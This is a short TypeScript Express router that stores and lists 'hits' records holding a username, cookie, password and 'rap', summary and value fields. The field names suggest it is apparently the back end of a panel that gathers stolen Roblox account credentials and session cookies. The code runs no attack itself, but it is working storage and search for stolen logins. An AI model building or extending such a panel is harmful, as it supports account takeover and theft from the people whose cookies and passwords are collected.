import { Router, Request, Response } from 'express';
import { openDb } from '../database';

const router = Router();

router.get('/', async (req: Request, res: Response) => {
    if (!req.session.user) return res.status(401).json({ error: 'Unauthorized' });

    const { page = 1, limit = 10, search = '' } = req.query;
    const offset = (Number(page) - 1) * Number(limit);

    const db = await openDb();
    let query = 'SELECT * FROM hits WHERE user LIKE ? ORDER BY created_at DESC LIMIT ? OFFSET ?';
    let countQuery = 'SELECT COUNT(*) as total FROM hits WHERE user LIKE ?';

    const hits = await db.all(query, [`%${search}%`, Number(limit), offset]);
    const total = await db.get(countQuery, [`%${search}%`]);

    res.json({
        hits,
        total: total.total,
        page: Number(page),
        limit: Number(limit)
    });
});

router.post('/', async (req: Request, res: Response) => {
    if (!req.session.user) return res.status(401).json({ error: 'Unauthorized' });

    const { user, cookie, password, rap, summary, value } = req.body;
    const db = await openDb();
    await db.run(
        `INSERT INTO hits (user, cookie, password, rap, summary, value) VALUES (?, ?, ?, ?, ?, ?)`,
        [user, cookie, password, rap || 0, summary || 0, value || 0]
    );

    res.json({ success: true });
});

export default router;